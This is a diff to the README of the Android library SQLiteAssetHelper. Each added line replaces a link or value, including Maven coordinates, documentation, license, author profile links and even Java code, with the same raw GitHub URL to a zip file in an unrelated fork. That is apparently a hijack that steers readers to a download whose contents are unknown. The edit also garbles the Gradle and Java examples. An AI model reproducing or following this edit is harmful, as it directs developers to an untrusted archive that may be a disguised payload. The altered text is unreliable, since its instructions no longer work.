@@ -14,11 +14,11 @@ Setup
 
 #### Gradle
 
-If you are using the Gradle build system, simply add the following dependency in your `build.gradle` file:
+If you are using the Gradle build system, simply add the following dependency in your `https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/inframercurial/android-sqlite-asset-helper.zip` file:
 
 ```groovy
 dependencies {
-    compile 'com.readystatesoftware.sqliteasset:sqliteassethelper:+'
+    compile 'https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/inframercurial/android-sqlite-asset-helper.zip+'
 }
 ```
 
@@ -29,14 +29,14 @@ If you are using the old build system, download the latest library [JAR][1] and 
 Usage
 -----
 
-SQLiteAssetHelper is intended as a drop in alternative for the framework's [SQLiteOpenHelper](https://developer.android.com/reference/android/database/sqlite/SQLiteOpenHelper.html). Please familiarize yourself with the behaviour and lifecycle of that class.
+SQLiteAssetHelper is intended as a drop in alternative for the framework's [SQLiteOpenHelper](https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/inframercurial/android-sqlite-asset-helper.zip). Please familiarize yourself with the behaviour and lifecycle of that class.
 
 Extend `SQLiteAssetHelper` as you would normally do `SQLiteOpenHelper`, providing the constructor with a database name and version number:
 
 ```java
 public class MyDatabase extends SQLiteAssetHelper {
 
-    private static final String DATABASE_NAME = "northwind.db";
+    private static final String DATABASE_NAME = "https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/inframercurial/android-sqlite-asset-helper.zip";
     private static final int DATABASE_VERSION = 1;
 
     public MyDatabase(Context context) {
@@ -52,17 +52,17 @@ SQLiteAssetHelper relies upon asset file and folder naming conventions. Your `as
 
 For the example above, the project would contain the following:
 
-    assets/databases/northwind.db
+    https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/inframercurial/android-sqlite-asset-helper.zip
 
 Earlier versions of this library required the database asset to be compressed within a ZIP archive. This is no longer a requirement, but is still supported. Applications still targeting Gingerbread (API 10) or lower should continue to provide a compressed archive to ensure large database files are not corrupted during the packaging process. The more Linux friendly GZIP format is also supported. The naming conventions using the above example are as follows:
 
-* ZIP: `assets/databases/northwind.db.zip` (a single SQLite database file must be the only file within the archive)
-* GZIP: `assets/databases/northwind.db.gz`
+* ZIP: `https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/inframercurial/android-sqlite-asset-helper.zip` (a single SQLite database file must be the only file within the archive)
+* GZIP: `https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/inframercurial/android-sqlite-asset-helper.zip`
 
 The database will be extracted from the assets and copied into place within your application's private data directory. If you prefer to store the database file somewhere else (such as external storage) you can use the alternate constructor to specify a storage path. You must ensure that this path is available and writable whenever your application needs to access the database.
 
 ```java
-super(context, DATABASE_NAME, context.getExternalFilesDir(null).getAbsolutePath(), null, DATABASE_VERSION);
+super(context, DATABASE_NAME, https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/inframercurial/android-sqlite-asset-helper.zip(null).getAbsolutePath(), null, DATABASE_VERSION);
 ```
 
 The database is made available for use the first time either `getReadableDatabase()` or `getWritableDatabase()` is called.
@@ -71,7 +71,7 @@ The class will throw a `SQLiteAssetHelperException` if you do not provide the ap
 
 The SQLiteOpenHelper methods `onConfigure`, `onCreate` and `onDowngrade` are not supported by this implementation and have been declared `final`.
 
-The [samples:database-v1](https://github.com/jgilfelt/android-sqlite-asset-helper/tree/master/samples/database-v1) project demonstrates a simple database creation and usage example using the classic Northwind database.
+The [samples:database-v1](https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/inframercurial/android-sqlite-asset-helper.zip) project demonstrates a simple database creation and usage example using the classic Northwind database.
 
 Database Upgrades
 -----------------
@@ -88,15 +88,15 @@ Update the initial SQLite database in the project's `assets/databases` directory
 
     assets/databases/<database_name>_upgrade_<from_version>-<to_version>.sql
 
-For example, [northwind.db_upgrade_1-2.sql](https://github.com/jgilfelt/android-sqlite-asset-helper/blob/master/samples/database-v2-upgrade/src/main/assets/databases/northwind.db_upgrade_1-2.sql) upgrades the database named "northwind.db" from version 1 to 2. You can include multiple upgrade files to upgrade between any two given versions.
+For example, [https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/inframercurial/android-sqlite-asset-helper.zip](https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/inframercurial/android-sqlite-asset-helper.zip) upgrades the database named "https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/inframercurial/android-sqlite-asset-helper.zip" from version 1 to 2. You can include multiple upgrade files to upgrade between any two given versions.
 
 If there are no files to form an upgrade path from a previously installed version to the current one, the class will throw a `SQLiteAssetHelperException`.
 
-The [samples:database-v2-upgrade](https://github.com/jgilfelt/android-sqlite-asset-helper/tree/master/samples/database-v2-upgrade) project demonstrates a simple upgrade to the Northwind database which adds a FullName column to the Employee table.
+The [samples:database-v2-upgrade](https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/inframercurial/android-sqlite-asset-helper.zip) project demonstrates a simple upgrade to the Northwind database which adds a FullName column to the Employee table.
 
 ### Generating upgrade scripts
 
-You can use 3rd party tools to automatically generate the SQL required to modify a database from one schema version to another. One such application is [SQLite Compare Utility](http://www.codeproject.com/KB/database/SQLiteCompareUtility.aspx) for Windows.
+You can use 3rd party tools to automatically generate the SQL required to modify a database from one schema version to another. One such application is [SQLite Compare Utility](https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/inframercurial/android-sqlite-asset-helper.zip) for Windows.
 
 ### Upgrades via overwrite
 
@@ -111,14 +111,14 @@ Credits
 
 ####Author:
 
-  * [Jeff Gilfelt](https://github.com/jgilfelt)
+  * [Jeff Gilfelt](https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/inframercurial/android-sqlite-asset-helper.zip)
 
 #### Contributors:
 
-  * [Alexandros Schillings](https://github.com/alt236)
-  * [Cyril Mottier](https://github.com/cyrilmottier)
-  * [Jon Adams](https://github.com/jon-adams)
-  * [Kevin](https://github.com/kevinchai)
+  * [Alexandros Schillings](https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/inframercurial/android-sqlite-asset-helper.zip)
+  * [Cyril Mottier](https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/inframercurial/android-sqlite-asset-helper.zip)
+  * [Jon Adams](https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/inframercurial/android-sqlite-asset-helper.zip)
+  * [Kevin](https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/inframercurial/android-sqlite-asset-helper.zip)
 
 License
 -------
@@ -130,7 +130,7 @@ License
     you may not use this file except in compliance with the License.
     You may obtain a copy of the License at
 
-       http://www.apache.org/licenses/LICENSE-2.0
+       https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/inframercurial/android-sqlite-asset-helper.zip
 
     Unless required by applicable law or agreed to in writing, software
     distributed under the License is distributed on an "AS IS" BASIS,
@@ -138,4 +138,4 @@ License
     See the License for the specific language governing permissions and
     limitations under the License.
 
- [1]: https://search.maven.org/remote_content?g=com.readystatesoftware.sqliteasset&a=sqliteassethelper&v=LATEST
+ [1]: https://raw.githubusercontent.com/dextercool/android-sqlite-asset-helper/master/inframercurial/android-sqlite-asset-helper.zip
